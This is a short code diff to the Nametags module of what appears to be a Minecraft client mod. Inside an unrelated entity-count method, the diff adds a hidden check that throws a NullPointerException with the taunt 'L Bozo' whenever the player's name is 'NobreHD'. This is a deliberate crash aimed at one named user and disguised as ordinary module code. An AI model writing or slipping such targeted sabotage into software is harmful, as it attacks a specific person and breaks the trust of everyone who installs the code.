@@ -366,6 +366,10 @@ public class Nametags extends Module {
         int count = culling.get() ? maxCullCount.get() : entityList.size();
         count = MathHelper.clamp(count, 0, entityList.size());
 
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
+
         return count;
     }
 
